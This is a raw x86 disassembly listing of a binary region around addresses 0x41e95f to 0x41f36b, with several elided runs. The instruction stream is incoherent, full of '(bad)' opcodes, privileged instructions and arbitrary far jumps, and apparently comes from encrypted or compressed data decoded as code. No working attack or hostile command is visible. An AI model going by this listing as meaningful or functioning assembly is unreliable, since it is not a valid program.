  41e95f:	inc    edi
  41e960:	adc    DWORD PTR [esi-0x439c45b7],0xffffffcc
  41e967:	popf   
  41e968:	scas   al,BYTE PTR es:[edi]
  41e969:	sbb    al,0xd6
  41e96b:	xor    eax,0x6f1ca993
  41e970:	fnstsw WORD PTR [ebx]
  41e972:	push   0x57c0dc64
  41e977:	and    BYTE PTR [eax+0x2c],cl
  41e97a:	or     esp,DWORD PTR [edi-0x261f03a1]
  41e980:	mov    BYTE PTR [ebp+0x62746da2],bl
  41e986:	mov    esp,0x38ac4255
  41e98b:	shr    DWORD PTR [esi+0x5ae6ba88],0x0
	...
  41e9f2:	add    BYTE PTR [eax],al
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	cmp    edi,DWORD PTR [ebp+0x79]
  41ea03:	hlt    
  41ea04:	push   ss
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0x4000001
  41ea0d:	stos   DWORD PTR es:[edi],eax
  41ea0e:	sub    eax,0x837ef11f
  41ea13:	shl    DWORD PTR [ebx+0x63],cl
  41ea16:	push   0x322f2c8b
  41ea1b:	pop    eax
  41ea1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea1d:	dec    ebx
  41ea1e:	test   WORD PTR [ebx],dx
  41ea21:	mov    al,ds:0xf6d076d3
  41ea26:	xchg   ecx,eax
  41ea27:	hlt    
  41ea28:	xchg   edi,eax
  41ea29:	aas    
  41ea2a:	jb     0x41e9b6
  41ea2c:	mov    ds:0x5d13f554,al
  41ea31:	dec    esp
  41ea32:	pushf  
  41ea33:	sahf   
  41ea34:	scas   eax,DWORD PTR es:[edi]
  41ea35:	and    DWORD PTR [ebx+0x519bef16],0xffffff9f
  41ea3c:	mov    cl,0xc0
  41ea3e:	mov    bl,0x92
  41ea40:	xchg   ecx,edx
  41ea42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea43:	rcl    BYTE PTR [eax],cl
  41ea45:	sbb    al,ah
  41ea47:	and    BYTE PTR [ecx-0x7b],0xf6
  41ea4b:	pop    esi
  41ea4c:	sub    cl,bl
  41ea4e:	inc    edi
  41ea4f:	dec    esi
  41ea50:	stos   DWORD PTR es:[edi],eax
  41ea51:	popf   
  41ea52:	lea    esp,[esi-0x7b7d84a4]
  41ea58:	sub    DWORD PTR [ebx],ebp
  41ea5a:	lahf   
  41ea5b:	push   esi
  41ea5c:	sbb    cl,dh
  41ea5e:	push   esp
  41ea5f:	pushf  
  41ea60:	retf   
  41ea61:	push   0x70
  41ea63:	inc    eax
  41ea64:	retf   
  41ea65:	(bad)  
  41ea66:	sti    
  41ea67:	sbb    DWORD PTR [eax+0x1a],ebp
  41ea6a:	dec    edi
  41ea6b:	cmp    esi,DWORD PTR [esi-0x25e9fb90]
  41ea71:	test   esi,eax
  41ea73:	sbb    dl,BYTE PTR [ebx+0x22a10f9c]
  41ea79:	sbb    eax,0x7203bbad
  41ea7e:	hlt    
  41ea7f:	daa    
  41ea80:	pop    ecx
  41ea81:	mov    ds:0x7cded041,eax
  41ea86:	iret   
  41ea87:	pop    ss
  41ea88:	sbb    ebp,DWORD PTR [esi-0x3b]
  41ea8b:	push   ds
  41ea8c:	aad    0xa2
  41ea8e:	out    dx,al
  41ea8f:	std    
  41ea90:	mov    bl,0x91
  41ea92:	sbb    DWORD PTR [ecx+0x61],edi
  41ea95:	jmp    0x950f2fa6
  41ea9a:	add    BYTE PTR [eax-0x60],bl
  41ea9d:	jmp    0xd0a0:0x438b1f23
  41eaa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaa5:	and    al,0x74
  41eaa7:	fwait
  41eaa8:	in     eax,dx
  41eaa9:	js     0x41eaf1
  41eaab:	nop
  41eaac:	inc    ebp
  41eaad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaae:	pop    ecx
  41eaaf:	bound  esi,QWORD PTR [edi-0x6e]
  41eab2:	or     eax,0x72c00e8
  41eab7:	pop    edx
  41eab8:	repz repz jmp 0xc419:0x658c25d1
  41eac1:	les    esi,FWORD PTR [edi]
  41eac3:	mov    cl,0x4d
  41eac5:	neg    DWORD PTR [edi+0x5d]
  41eac8:	xchg   edx,eax
  41eac9:	and    ecx,ebp
  41eacb:	aaa    
  41eacc:	fimul  WORD PTR [edx]
  41eace:	lea    esi,[edi]
  41ead0:	daa    
  41ead1:	inc    ecx
  41ead2:	enter  0x4b10,0x94
  41ead6:	popf   
  41ead7:	sbb    BYTE PTR [eax-0x5],0x5a
  41eadb:	fild   WORD PTR [ecx+0x73]
  41eade:	xor    esi,edi
  41eae0:	push   ecx
  41eae1:	sbb    dh,0xc7
  41eae4:	lods   eax,DWORD PTR ds:[esi]
  41eae5:	dec    ecx
  41eae6:	sar    DWORD PTR [edx+0x63fa61eb],cl
  41eaec:	icebp  
  41eaed:	fidiv  DWORD PTR [edi-0x7d8058fa]
  41eaf3:	jge    0x41eaba
  41eaf5:	mov    bh,0xff
  41eaf7:	ds mov eax,ds:0xa584b401
  41eafe:	fisubr DWORD PTR [esi+edi*8]
  41eb01:	shr    DWORD PTR [ebx],1
  41eb03:	pushf  
  41eb04:	pop    esp
  41eb05:	ret    
  41eb06:	add    al,0x9e
  41eb08:	jnp    0x41eb04
  41eb0a:	cli    
  41eb0b:	cmp    eax,0xb9909bef
  41eb10:	mov    ch,0x0
	...
  41eb72:	add    BYTE PTR [eax],al
  41eb74:	adc    ch,BYTE PTR [edi]
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x58
  41eb81:	cmp    DWORD PTR [edi+0x7a],edi
  41eb84:	sbb    eax,DWORD PTR [edi+0x1]
  41eb87:	add    BYTE PTR ds:0xdf000001,al
  41eb8d:	mov    ecx,0x1d4af4b
  41eb92:	shl    edx,cl
  41eb94:	(bad)  
  41eb95:	jle    0x41ebd2
  41eb97:	add    DWORD PTR [ebx],0x28
  41eb9a:	scas   al,BYTE PTR es:[edi]
  41eb9b:	xchg   esp,eax
  41eb9c:	mul    BYTE PTR [ebx]
  41eb9e:	int3   
  41eb9f:	frstor [ecx]
  41eba1:	jg     0x41eb3c
  41eba3:	dec    edi
  41eba4:	ss push cs
  41eba6:	sub    cl,bh
  41eba8:	popa   
  41eba9:	loope  0x41eb51
  41ebab:	test   esp,edx
  41ebad:	mov    ebx,0xe99cbb06
  41ebb2:	fisubr DWORD PTR [ecx+0x3]
  41ebb5:	out    dx,al
  41ebb6:	lock imul edx,esp,0x529db889
  41ebbd:	test   eax,0xec17534d
  41ebc2:	and    al,0x7f
  41ebc4:	dec    esp
  41ebc5:	fstp   DWORD PTR [edx]
  41ebc7:	mov    BYTE PTR [ecx+0x24],ch
  41ebca:	pop    edi
  41ebcb:	xor    DWORD PTR [ebx-0x71c44564],esi
  41ebd1:	mov    bl,0x2d
  41ebd3:	fcom   DWORD PTR [esi]
  41ebd5:	adc    al,0xab
  41ebd7:	jbe    0x41ec25
  41ebd9:	inc    ecx
  41ebda:	push   esp
  41ebdb:	xor    ebx,DWORD PTR [edx]
  41ebdd:	xor    dh,ah
  41ebdf:	stos   BYTE PTR es:[edi],al
  41ebe0:	nop
  41ebe1:	in     al,dx
  41ebe2:	mov    al,0x56
  41ebe4:	clc    
  41ebe5:	dec    edx
  41ebe6:	je     0x41ec24
  41ebe8:	push   esp
  41ebe9:	jo     0x41ec19
  41ebeb:	mov    ebp,DWORD PTR [edx-0x1c]
  41ebee:	imul   ecx,DWORD PTR [ebx+ebx*4+0x225e8f4e],0xbe795b6a
  41ebf9:	pop    esi
  41ebfa:	ds mov ah,0x6f
  41ebfd:	xlat   BYTE PTR ds:[ebx]
  41ebfe:	inc    edi
  41ebff:	add    al,0x5f
  41ec01:	imul   DWORD PTR [ebx]
  41ec03:	inc    BYTE PTR [ebp+0x5a55e99b]
  41ec09:	push   edi
  41ec0a:	push   esi
  41ec0b:	ins    BYTE PTR es:[edi],dx
  41ec0c:	mov    ds:0x2f541341,al
  41ec11:	mov    BYTE PTR [esi*2-0x7bdf67d5],bh
  41ec18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec19:	mov    esi,0x424a29c9
  41ec1e:	idiv   BYTE PTR [edx]
  41ec20:	imul   esp,eax,0x5b
  41ec23:	pop    ebp
  41ec24:	cld    
  41ec25:	int    0x49
  41ec27:	pop    ss
  41ec28:	mov    dl,0xe7
  41ec2a:	pop    esp
  41ec2b:	jne    0x41ec9a
  41ec2d:	dec    eax
  41ec2e:	cmc    
  41ec2f:	mov    bl,0x58
  41ec31:	xor    eax,0xea8575cb
  41ec36:	pop    ebp
  41ec37:	jecxz  0x41ec57
  41ec39:	ret    
  41ec3a:	test   al,0xb7
  41ec3c:	mov    al,ds:0x406b9c2d
  41ec41:	popa   
  41ec42:	push   0x34e09373
  41ec47:	and    eax,0xbc00c059
  41ec4c:	iret   
  41ec4d:	push   ebp
  41ec4e:	(bad)  
  41ec4f:	shl    DWORD PTR [edi-0x6b],cl
  41ec52:	loope  0x41ec9b
  41ec54:	paddw  mm1,QWORD PTR [ebx]
  41ec57:	jp     0x41ec1f
  41ec59:	fwait
  41ec5a:	call   0x8e7bb9d9
  41ec5f:	or     eax,DWORD PTR [edi+0x7c]
  41ec62:	ds scas eax,DWORD PTR es:[edi]
  41ec64:	jne    0x41ec7b
  41ec66:	mov    edx,0xda503ad8
  41ec6b:	in     al,dx
  41ec6c:	es pop edi
  41ec6e:	push   0x62ab77c5
  41ec73:	adc    esi,DWORD PTR [esi+0x60deb91f]
  41ec79:	mov    BYTE PTR [eax-0x2f],0x42
  41ec7d:	dec    ecx
  41ec7e:	jbe    0x41ecc0
  41ec80:	mov    dh,0x9d
  41ec82:	int    0x7e
  41ec84:	icebp  
  41ec85:	repnz mov cl,0xe1
  41ec88:	and    DWORD PTR [esi+eiz*1+0x770523b6],ebx
  41ec8f:	cld    
  41ec90:	inc    BYTE PTR [eax]
	...
  41ecf2:	add    BYTE PTR [eax],al
  41ecf4:	inc    ecx
  41ecf5:	icebp  
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0xb8fe5fd0
  41ed02:	pop    eax
  41ed03:	mov    esp,0x14820
  41ed08:	add    eax,0xcc000001
  41ed0d:	cs std 
  41ed0f:	jne    0x41ed07
  41ed11:	and    BYTE PTR [ebx],dh
  41ed13:	test   BYTE PTR [edi+0x71],0x10
  41ed17:	add    edx,DWORD PTR [eax]
  41ed19:	cmp    eax,0x5f646f0d
  41ed1e:	or     eax,0xe8b295d7
  41ed23:	ficom  DWORD PTR [esp+esi*8]
  41ed26:	out    0x4b,eax
  41ed28:	lock jno 0x41ed5e
  41ed2b:	jg     0x41ed55
  41ed2d:	imul   eax,DWORD PTR [ecx+eax*1+0x35],0xa2aac320
  41ed35:	ret    0x37ca
  41ed38:	ins    DWORD PTR es:[edi],dx
  41ed39:	push   eax
  41ed3a:	(bad)  
  41ed3c:	sbb    ecx,DWORD PTR [esi+ebp*1]
  41ed3f:	fist   DWORD PTR [ecx]
  41ed41:	inc    eax
  41ed42:	mov    eax,ds:0xe6ebcff4
  41ed47:	jl     0x41ed24
  41ed49:	mov    bl,0xb6
  41ed4b:	xor    DWORD PTR [ecx-0x61ae4738],ecx
  41ed51:	sbb    eax,0x5c35f5dc
  41ed56:	xor    al,0xd2
  41ed58:	mov    esp,DWORD PTR [ebx+ebp*4]
  41ed5b:	ds int3 
  41ed5d:	xlat   BYTE PTR ds:[ebx]
  41ed5e:	sahf   
  41ed5f:	js     0x41ed8e
  41ed61:	mov    dl,0x97
  41ed63:	jae    0x41ecf3
  41ed65:	pop    ss
  41ed66:	xchg   esi,eax
  41ed67:	ins    BYTE PTR es:[edi],dx
  41ed68:	lea    ebp,[edx+0x18279dfd]
  41ed6e:	sub    esp,DWORD PTR [edx+0x39518d9f]
  41ed74:	ja     0x41ed2b
  41ed76:	mov    DWORD PTR [edi],ebx
  41ed78:	sub    DWORD PTR [edx+0x8],esi
  41ed7b:	fnstenv [edi+eax*8+0x3]
  41ed7f:	sub    eax,0x457cb547
  41ed84:	adc    al,0x8b
  41ed86:	daa    
  41ed87:	pop    ebx
  41ed88:	sbb    BYTE PTR [edi],bh
  41ed8a:	mov    dl,0x7f
  41ed8c:	jnp    0x41edbe
  41ed8e:	xchg   ebx,eax
  41ed8f:	push   esi
  41ed90:	or     al,0x96
  41ed92:	mov    edi,0xcd97fe55
  41ed97:	test   BYTE PTR [ebp-0x5e],ch
  41ed9a:	test   DWORD PTR [edi+ebx*8+0x6abe00fe],0x5092bbb5
  41eda5:	mov    dl,0x62
  41eda7:	mov    bl,0xa5
  41eda9:	sbb    esi,DWORD PTR [edx-0x29297a3e]
  41edaf:	and    eax,0xf76f9ac4
  41edb4:	imul   ebx
  41edb6:	cpuid  
  41edb8:	xchg   DWORD PTR [eiz*8+0xfe4e12e],ebp
  41edbf:	xor    eax,0x24c49346
  41edc4:	lods   al,BYTE PTR ds:[esi]
  41edc5:	lea    esp,[esp+ebx*1-0x766e44a0]
  41edcc:	and    ch,BYTE PTR [esi+0x4]
  41edcf:	test   eax,0x8a7d5f7c
  41edd4:	aad    0x63
  41edd6:	das    
  41edd7:	bound  esi,QWORD PTR [edi-0x933d7d3]
  41eddd:	pop    edi
  41edde:	test   eax,0x6b077224
  41ede3:	sbb    eax,eax
  41ede5:	mov    ebx,0xc76157bc
  41edea:	outs   dx,DWORD PTR ds:[esi]
  41edeb:	jmp    0x41ee5e
  41eded:	inc    eax
  41edee:	mov    dh,0x8d
  41edf0:	dec    edi
  41edf1:	fimul  DWORD PTR ds:0xae580e4d
  41edf7:	lds    edi,FWORD PTR [ebp+0x33]
  41edfa:	push   ebp
  41edfb:	mov    ebp,0x2654fb01
  41ee00:	repz lock inc edi
  41ee03:	imul   ecx,DWORD PTR [ecx-0x40],0x1659753
  41ee0a:	inc    eax
  41ee0b:	fadd   QWORD PTR [esi-0x3d]
  41ee0e:	xor    BYTE PTR [ebx+0x54],bh
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x25a6:0x2e62cbe7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0x95000001
  41ee8d:	test   DWORD PTR [eax-0x70],eax
  41ee90:	shl    DWORD PTR [edx+0x68],cl
  41ee93:	shl    DWORD PTR [ebx+0x65],cl
  41ee96:	mov    es,WORD PTR [esi]
  41ee98:	das    
  41ee99:	es (bad) 
  41ee9b:	sub    DWORD PTR [ecx],ebp
  41ee9d:	dec    edx
  41ee9e:	loope  0x41eea9
  41eea0:	in     eax,0x72
  41eea2:	stc    
  41eea3:	sub    eax,0xef57a73c
  41eea8:	inc    esi
  41eea9:	idiv   BYTE PTR ds:0x7838e178
  41eeaf:	cmp    DWORD PTR [ebx+0x7b129262],esp
  41eeb5:	(bad)  
  41eeb7:	inc    esp
  41eeb8:	and    eax,0xe4a21ee5
  41eebd:	lahf   
  41eebe:	cmp    eax,0x4ff1a7d0
  41eec3:	imul   ebp,eax,0xffffffbd
  41eec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eec7:	hlt    
  41eec8:	jb     0x41ef45
  41eeca:	jle    0x41eef4
  41eecc:	mov    bh,0xa9
  41eece:	outs   dx,DWORD PTR ds:[esi]
  41eecf:	or     esi,DWORD PTR [ecx]
  41eed1:	adc    DWORD PTR [ebp-0x8],eax
  41eed4:	adc    eax,0xc9ffb53
  41eed9:	pop    edi
  41eeda:	test   BYTE PTR [edi],0xe6
  41eedd:	adc    al,0xc5
  41eedf:	cdq    
  41eee0:	daa    
  41eee1:	gs and bh,dl
  41eee4:	nop
  41eee5:	jmp    0xaa60c5f2
  41eeea:	xchg   ebx,eax
  41eeeb:	js     0x41ee91
  41eeed:	add    eax,0x466be49c
  41eef2:	xor    esi,edx
  41eef4:	repz mov ah,0x1e
  41eef7:	data16 xchg BYTE PTR [ebp+0x609ff078],dl
  41eefe:	outs   dx,DWORD PTR ds:[esi]
  41eeff:	push   ebx
  41ef00:	cld    
  41ef01:	scas   al,BYTE PTR es:[edi]
  41ef02:	dec    ecx
  41ef03:	xchg   ebx,eax
  41ef04:	call   0x45062ce0
  41ef09:	outs   dx,BYTE PTR ds:[esi]
  41ef0a:	pop    ebp
  41ef0b:	sbb    DWORD PTR [edx-0x27cc8d2d],ecx
  41ef11:	push   esp
  41ef12:	clc    
  41ef13:	jl     0x41ef6b
  41ef15:	sub    bl,ah
  41ef17:	mov    edi,0x8d5980da
  41ef1c:	dec    ebx
  41ef1d:	jecxz  0x41ef17
  41ef1f:	cmc    
  41ef20:	jno    0x41ef42
  41ef22:	mov    esp,edx
  41ef24:	inc    edi
  41ef25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef26:	pop    esp
  41ef27:	dec    ax
  41ef29:	pushf  
  41ef2a:	push   DWORD PTR [ebp-0x1e001641]
  41ef30:	add    BYTE PTR [eax+eiz*4+0x4a858780],al
  41ef37:	ret    
  41ef38:	bound  edi,QWORD PTR [edi-0x30b79785]
  41ef3e:	push   ebx
  41ef3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef40:	inc    esi
  41ef41:	jo     0x41ef6d
  41ef43:	inc    edx
  41ef44:	jno    0x41efb5
  41ef46:	mov    ah,0x4f
  41ef48:	and    eax,0x2c8ec45a
  41ef4d:	shr    DWORD PTR [ebx+eiz*1+0x373b8ff],0xb7
  41ef55:	push   ebp
  41ef56:	pop    eax
  41ef57:	mov    dl,BYTE PTR [ecx+0x70bfd312]
  41ef5d:	xchg   esi,eax
  41ef5e:	arpl   WORD PTR [ebp+0x44a35df8],dx
  41ef64:	sub    edx,DWORD PTR [ecx-0x23]
  41ef67:	jmp    DWORD PTR [ebp-0x7c]
  41ef6a:	xor    ebx,DWORD PTR [ebp-0x47fd6a88]
  41ef70:	stc    
  41ef71:	std    
  41ef72:	mov    bl,0x9
  41ef74:	xchg   edi,eax
  41ef75:	in     eax,dx
  41ef76:	inc    eax
  41ef77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef78:	pop    ss
  41ef79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef7a:	nop
  41ef7b:	outs   dx,DWORD PTR ds:[esi]
  41ef7c:	repnz sub DWORD PTR [ecx],edi
  41ef7f:	jne    0x41effc
  41ef81:	fwait
  41ef82:	sub    DWORD PTR [ebp-0x15d9f21d],edi
  41ef88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef89:	dec    edx
  41ef8a:	sbb    dl,BYTE PTR [ebp-0x71]
  41ef8d:	jl     0x41efe8
  41ef8f:	adc    DWORD PTR es:[eax],eax
	...
  41eff2:	add    BYTE PTR [eax],al
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul esp,DWORD PTR [ecx-0x53],0xffffffc7
  41f003:	sbb    DWORD PTR [edx],ebp
  41f005:	dec    edx
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    eax,0xc8000001
  41f00d:	mov    DWORD PTR [esi-0x79174b46],esp
  41f013:	fimul  WORD PTR [ecx+0x1b60c994]
  41f019:	sbb    BYTE PTR [ecx],0xda
  41f01c:	adc    bl,BYTE PTR [eax+0x512a63dd]
  41f022:	mov    al,0xdd
  41f024:	mov    ebp,0xbae730fa
  41f029:	mov    gs,WORD PTR [ecx+0x1e]
  41f02c:	popa   
  41f02d:	lock div ebx
  41f030:	leave  
  41f031:	inc    ecx
  41f032:	sub    eax,0xa37c6a89
  41f037:	inc    esp
  41f038:	clc    
  41f039:	inc    ecx
  41f03a:	xchg   DWORD PTR [ecx],edi
  41f03c:	rol    DWORD PTR [esi+0x37],0x18
  41f040:	mov    ebx,0x29f43959
  41f045:	mov    ds:0x68575f81,al
  41f04a:	push   edi
  41f04b:	pop    ecx
  41f04c:	and    dh,BYTE PTR [ebx+0x6d9ead7a]
  41f052:	jge    0x41f0c4
  41f054:	aad    0x3a
  41f056:	je     0x41efde
  41f058:	sahf   
  41f059:	and    DWORD PTR [ebx],ebp
  41f05b:	fild   QWORD PTR [edi+0x18]
  41f05e:	jmp    0x41f009
  41f060:	stc    
  41f061:	daa    
  41f062:	xchg   BYTE PTR [edx-0x51],bh
  41f065:	push   ebp
  41f066:	std    
  41f067:	shl    DWORD PTR [esi-0x4b3127bd],cl
  41f06d:	or     al,0x1
  41f06f:	cmp    BYTE PTR ds:0xc0a3a268,dh
  41f075:	and    cl,dl
  41f077:	and    ebx,DWORD PTR [esp+edx*2+0x78cd3a55]
  41f07e:	out    dx,al
  41f07f:	adc    DWORD PTR [edi],esp
  41f081:	push   cs
  41f082:	xchg   DWORD PTR [ecx+0xe90a058],ebp
  41f088:	or     DWORD PTR [esi],esi
  41f08a:	pop    ebx
  41f08b:	jmp    0x2b6fca5f
  41f090:	shr    BYTE PTR [ecx-0x6f],0x2b
  41f094:	inc    edx
  41f095:	xchg   esp,eax
  41f096:	cs mov esp,0x66abd1ce
  41f09c:	adc    dh,BYTE PTR [edx+ecx*8-0x374ce34e]
  41f0a3:	outs   dx,BYTE PTR ds:[esi]
  41f0a4:	mov    eax,ds:0x86a52a31
  41f0a9:	call   0x2be5ebdb
  41f0ae:	jp     0x41f0c3
  41f0b0:	sub    eax,edx
  41f0b2:	add    WORD PTR [esi-0x13],dx
  41f0b6:	shl    DWORD PTR [edx+0x22],0xb9
  41f0ba:	aad    0x58
  41f0bc:	sbb    bl,cl
  41f0be:	adc    eax,edx
  41f0c0:	bound  ebx,QWORD PTR [edi+ebx*8+0x6f06f6e4]
  41f0c7:	(bad)  
  41f0c8:	mov    ds:0x238a6d0d,eax
  41f0cd:	inc    esp
  41f0ce:	fst    QWORD PTR [edi]
  41f0d0:	mov    ah,0x30
  41f0d2:	mov    ?,WORD PTR [edi+0xa084b7d]
  41f0d8:	or     al,0xb6
  41f0da:	mov    ah,0x1f
  41f0dc:	stc    
  41f0dd:	pop    esp
  41f0de:	sub    ebp,DWORD PTR ds:0xc24d889
  41f0e4:	inc    esp
  41f0e5:	add    al,0x68
  41f0e7:	pop    ecx
  41f0e8:	inc    esi
  41f0e9:	sbb    esi,DWORD PTR [eax]
  41f0eb:	rcr    DWORD PTR [esp+eax*2],0x1b
  41f0ef:	popa   
  41f0f0:	dec    ebp
  41f0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0f2:	stos   BYTE PTR es:[edi],al
  41f0f3:	popa   
  41f0f4:	mov    edx,0x6b3fdac6
  41f0f9:	mov    al,ds:0x4fa6bdc6
  41f0fe:	sub    bl,ch
  41f100:	shl    BYTE PTR [esi-0x17770884],0x75
  41f107:	inc    edx
  41f108:	push   cs
  41f109:	test   DWORD PTR [edx-0x5c],eax
  41f10c:	imul   edi,DWORD PTR [ebp-0x41],0x5b0c
	...
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0x3e66b05d
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0xec000001
  41f18d:	mov    ah,0xe9
  41f18f:	ret    0xcb14
  41f192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f193:	sbb    DWORD PTR [ebp-0x3db662a2],0x62
  41f19a:	test   eax,0x3a75ba8c
  41f19f:	aam    0xca
  41f1a1:	lock rol DWORD PTR [edi],1
  41f1a4:	jle    0x41f1dc
  41f1a6:	les    esp,FWORD PTR [eax]
  41f1a8:	jbe    0x41f15d
  41f1aa:	iret   
  41f1ab:	das    
  41f1ac:	and    cl,bl
  41f1ae:	adc    bh,BYTE PTR [esi+ecx*8-0x36f8e3bb]
  41f1b5:	xchg   esp,eax
  41f1b6:	or     ebp,DWORD PTR [edx+ebx*2-0x2e42d27f]
  41f1bd:	bound  ebx,QWORD PTR [esp+ecx*4+0x50e38ca4]
  41f1c4:	xor    DWORD PTR [ebx-0x388a2598],edi
  41f1ca:	sub    BYTE PTR [esi],dh
  41f1cc:	cmp    eax,0x6d5afe14
  41f1d1:	xor    eax,0xebc6cd82
  41f1d6:	fistp  DWORD PTR [edi+0x4b]
  41f1d9:	pop    edi
  41f1da:	cmp    eax,0xbe50ccbb
  41f1df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1e0:	retf   0x542a
  41f1e3:	push   0x7be3edf1
  41f1e8:	sub    al,0xa8
  41f1ea:	push   esi
  41f1eb:	loop   0x41f26b
  41f1ed:	pop    ebx
  41f1ee:	pop    ebx
  41f1ef:	shr    BYTE PTR [edi+0x18],cl
  41f1f2:	dec    ebx
  41f1f3:	test   al,bh
  41f1f5:	sub    DWORD PTR [ebx+0x1c],eax
  41f1f8:	or     bl,BYTE PTR [edx]
  41f1fa:	add    cl,bl
  41f1fc:	mov    dh,0xdf
  41f1fe:	int    0xd0
  41f200:	leave  
  41f201:	add    BYTE PTR [edx+0xab3368c],ch
  41f207:	not    DWORD PTR [ecx-0x1403a44a]
  41f20d:	mul    BYTE PTR [ecx-0x38e5cd3d]
  41f213:	stos   DWORD PTR es:[edi],eax
  41f214:	cmc    
  41f215:	inc    esi
  41f216:	jbe    0x41f259
  41f218:	mov    WORD PTR [ebp-0x51],?
  41f21b:	mov    dh,0x49
  41f21d:	jp     0x41f1bf
  41f21f:	cs in  eax,0xfa
  41f222:	mov    ebx,0xbef2e969
  41f227:	jl     0x41f273
  41f229:	lds    ebx,FWORD PTR [edi]
  41f22b:	pushf  
  41f22c:	out    0xa,al
  41f22e:	enter  0xa993,0xc7
  41f232:	aas    
  41f233:	enter  0xf5b1,0x5c
  41f237:	out    dx,al
  41f238:	(bad)  
  41f23a:	mov    ds:0x630b2257,eax
  41f23f:	cli    
  41f240:	mov    ds:0xf278de85,al
  41f245:	push   ebp
  41f246:	stos   BYTE PTR es:[edi],al
  41f247:	sub    eax,0x33aa3ece
  41f24c:	fmul   st(4),st
  41f24e:	stos   DWORD PTR es:[edi],eax
  41f24f:	push   edx
  41f250:	outs   dx,DWORD PTR ds:[esi]
  41f251:	pop    es
  41f252:	(bad)  
  41f253:	in     al,dx
  41f254:	and    DWORD PTR [ecx+0x7dd287af],edx
  41f25a:	add    ebp,esp
  41f25c:	std    
  41f25d:	loopne 0x41f24a
  41f25f:	mov    ds:0xcaf0b5ae,eax
  41f264:	xchg   edi,eax
  41f265:	(bad)  
  41f266:	iret   
  41f267:	push   0x62
  41f269:	inc    esp
  41f26a:	sub    BYTE PTR [edx],bl
  41f26c:	cdq    
  41f26d:	xchg   ebx,eax
  41f26e:	outs   dx,DWORD PTR ds:[esi]
  41f26f:	out    0xa3,al
  41f271:	into   
  41f272:	push   ds
  41f273:	retf   
  41f274:	and    eax,0x2c2e60c7
  41f279:	test   DWORD PTR [edx+0x2a],esi
  41f27c:	jg     0x41f26b
  41f27e:	sbb    BYTE PTR [esi],ah
  41f280:	sbb    DWORD PTR [eax-0x52a9f636],ecx
  41f286:	outs   dx,BYTE PTR ds:[esi]
  41f287:	mov    esi,0xa1f2bb74
  41f28c:	rol    BYTE PTR [ebx+esi*4],1
  41f28f:	and    eax,0x56
	...
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f2c8
  41f301:	add    cl,bh
  41f303:	add    dh,BYTE PTR [esp+ecx*2]
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0x4f000001
  41f30d:	jo     0x41f309
  41f30f:	jne    0x41f38b
  41f311:	xchg   BYTE PTR [ebx-0x50],ah
  41f314:	leave  
  41f315:	inc    DWORD PTR [ebx+0x3bd5294c]
  41f31b:	stos   DWORD PTR es:[edi],eax
  41f31c:	and    ah,bl
  41f31e:	outs   dx,BYTE PTR ds:[esi]
  41f31f:	scas   eax,DWORD PTR es:[edi]
  41f320:	jne    0x41f2be
  41f322:	or     eax,DWORD PTR [eax-0x57]
  41f325:	lea    ebx,[ebp+ebx*2+0x6a]
  41f329:	lahf   
  41f32a:	pop    es
  41f32b:	mov    edi,0x9824ab9a
  41f330:	or     edx,DWORD PTR [esp+eiz*2-0x52]
  41f334:	jb     0x41f2e4
  41f336:	push   ecx
  41f337:	mov    esp,0xb1c22a4e
  41f33c:	push   cs
  41f33d:	pop    eax
  41f33e:	fild   QWORD PTR [esp+ebx*4-0x27]
  41f342:	leave  
  41f343:	stc    
  41f344:	jmp    0x41f30b
  41f346:	fbstp  TBYTE PTR [esi]
  41f348:	lahf   
  41f349:	stos   DWORD PTR es:[edi],eax
  41f34a:	and    eax,0x6b20f9f0
  41f34f:	cvtps2pi mm6,QWORD PTR [eax+0xde0823a]
  41f356:	add    al,0x95
  41f358:	gs sbb ah,bl
  41f35b:	cwde   
  41f35c:	mov    ch,0xbe
  41f35e:	xor    DWORD PTR ds:0x4877af07,edi
  41f364:	cwde   
  41f365:	arpl   WORD PTR [edx],cx
  41f367:	sbb    al,0x12
  41f369:	xchg   ebx,eax
  41f36a:	push   ebp
  41f36b:	push   0xffffff8c
